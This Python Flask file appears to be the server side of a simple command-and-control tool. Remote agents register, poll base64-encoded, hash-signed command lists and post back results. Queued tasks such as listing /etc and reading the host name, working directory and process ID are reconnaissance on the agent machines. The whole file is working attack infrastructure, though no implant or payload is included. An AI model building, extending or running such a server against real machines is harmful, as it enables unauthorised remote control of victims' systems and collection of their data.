import hashlib
import base64
from flask import Flask, request

# import ssl

PORT = 9998
active = "passive"

cmds = []

app = Flask(__name__)

agent_db = {}


def register_agent(uname, uid):
	global agent_db
	base = {
		"uname": uname,
		"commands": {},
		"poll": "active",
		"password": "password"
	}
	if uid not in agent_db:
		agent_db[uid] = base
		global cmds
		for cmd in cmds:
			add_all(cmd)
	else:
		print("Agent already registered")


@app.post("/register")
def register():
	data = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split("::")
	register_agent(data[0], data[1])
	return "", 200



@app.get("/<uid>/commands")
def serve_commands(uid):
	global agent_db
	print(agent_db)
	commands = agent_db[uid]["poll"] + "\n"
	password = agent_db[uid]["password"]
	for cmd in agent_db[uid]["commands"].keys():
		hashed = hashlib.sha256(f"{password}::{cmd}".encode("utf-8")).hexdigest()
		commands += f"{password}::{cmd}::{hashed}\n"
	return base64.urlsafe_b64encode(bytes(commands.encode('utf-8')))


# @app.post("/data")
# def receive_data():
# 	data = base64.urlsafe_b64decode(bytes(request.data))
# 	print(str(data, "utf-8"))
# 	return "", 200

@app.post("/<uid>/data")
def recieve_data(uid):
	data = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split("::")
	command = data[0]
	parameters = data[1]
	result = data[2]
	print(data)
	global agent_db
	agent_db[uid]["commands"][f"{command}::{parameters}"] = result
	print(agent_db)
	return "", 200

def add_command(command, uid):
	global agent_db

	agent_db[uid]["commands"][command] = "!EMPTY!"

def add_all(command):
	global agent_db
	for uid in agent_db.keys():
		add_command(command, uid)


if __name__ == "__main__":
	cmds.append("ls::/etc")
	cmds.append("BUILTIN::name")
	cmds.append("BUILTIN::cwd")
	cmds.append("BUILTIN::pid")

	app.run(host="localhost", port=PORT, debug=True)
